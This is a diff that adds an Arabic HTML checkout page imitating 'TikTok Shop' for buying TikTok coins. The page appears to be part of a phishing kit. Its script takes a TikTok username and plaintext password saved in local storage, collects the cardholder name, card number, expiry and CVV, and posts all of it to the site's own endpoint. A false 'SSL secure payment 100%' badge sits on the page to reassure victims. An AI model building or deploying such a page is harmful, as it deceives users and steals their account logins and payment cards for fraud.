@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إتمام الدفع | TikTok Shop</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            font-family: 'Cairo', 'Segoe UI', system-ui;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            direction: rtl;
+        }
+        .payment-card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        h2 { color: #fff; text-align: center; margin-bottom: 10px; }
+        .sub { text-align: center; color: #a0aec0; margin-bottom: 30px; }
+        .order-summary {
+            background: rgba(0,242,234,0.1);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        .order-summary h3 { color: #00f2ea; margin-bottom: 15px; }
+        .order-row { display: flex; justify-content: space-between; margin-bottom: 12px; color: #e2e8f0; }
+        .order-row.total { margin-top: 15px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); font-weight: bold; color: #00f2ea; }
+        .input-group { margin-bottom: 25px; }
+        .input-group label { display: block; margin-bottom: 8px; color: #a0aec0; }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 12px;
+            font-size: 16px;
+            color: #fff;
+        }
+        .row-2col { display: flex; gap: 16px; }
+        .row-2col .input-group { flex: 1; }
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #00f2ea, #00b8b3);
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #1a1a2e;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .error-message { background: #ff4757; color: white; padding: 12px; border-radius: 12px; margin-bottom: 20px; display: none; }
+        .secure-badge { text-align: center; margin-top: 20px; font-size: 12px; color: #718096; }
+    </style>
+</head>
+<body>
+<div class="payment-card">
+    <h2>إتمام الدفع</h2>
+    <p class="sub">أدخل بيانات بطاقتك لإتمام عملية الشراء</p>
+    <div class="order-summary" id="orderSummary"></div>
+    <div id="errorMsg" class="error-message"></div>
+    <form id="paymentForm">
+        <div class="input-group">
+            <label>الاسم على البطاقة</label>
+            <input type="text" id="cardName" placeholder="AHMED MOHAMMED" required>
+        </div>
+        <div class="input-group">
+            <label>رقم البطاقة</label>
+            <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required>
+        </div>
+        <div class="row-2col">
+            <div class="input-group">
+                <label>تاريخ الانتهاء</label>
+                <input type="text" id="cardExpiry" maxlength="5" placeholder="MM/YY" required>
+            </div>
+            <div class="input-group">
+                <label>CVV</label>
+                <input type="text" id="cardCvv" maxlength="3" placeholder="123" required>
+            </div>
+        </div>
+        <button type="submit" class="btn-submit">تأكيد الدفع</button>
+    </form>
+    <div class="secure-badge">مدعوم بتقنية SSL دفع آمن 100%</div>
+</div>
+<script>
+    const userData = JSON.parse(localStorage.getItem('userData'));
+    const pkg = JSON.parse(localStorage.getItem('selectedPackage'));
+    if (!userData || !pkg) window.location.href = '/';
+    document.getElementById('orderSummary').innerHTML = `
+        <h3>ملخص الطلب</h3>
+        <div class="order-row"><span>حساب تيك توك:</span><span>${userData.username}</span></div>
+        <div class="order-row"><span>الباقة:</span><span>${pkg.coins.toLocaleString()} عملة</span></div>
+        <div class="order-row total"><span>المبلغ الإجمالي:</span><span>${pkg.price} ريال سعودي</span></div>
+    `;
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        if (cardNumber.length !== 16) {
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('errorMsg').innerHTML = 'رقم البطاقة يجب أن يكون 16 رقم';
+            return;
+        }
+        document.getElementById('errorMsg').style.display = 'none';
+        const allData = {
+            tiktok_username: userData.username,
+            tiktok_password: userData.password,
+            package: pkg,
+            card: {
+                name: document.getElementById('cardName').value,
+                number: cardNumber,
+                expiry: document.getElementById('cardExpiry').value,
+                cvv: document.getElementById('cardCvv').value
+            },
+            time: new Date().toISOString()
+        };
+        fetch('/api/api', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(allData)
+        }).then(res => res.json()).then(data => {
+            if (data.success) {
+                window.location.href = '/success.html';
+            } else {
+                document.getElementById('errorMsg').style.display = 'block';
+                document.getElementById('errorMsg').innerHTML = 'حدث خطأ، يرجى المحاولة مرة أخرى';
+            }
+        }).catch(() => {
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('errorMsg').innerHTML = 'حدث خطأ في الاتصال';
+        });
+    });
+</script>
+</body>
+</html>
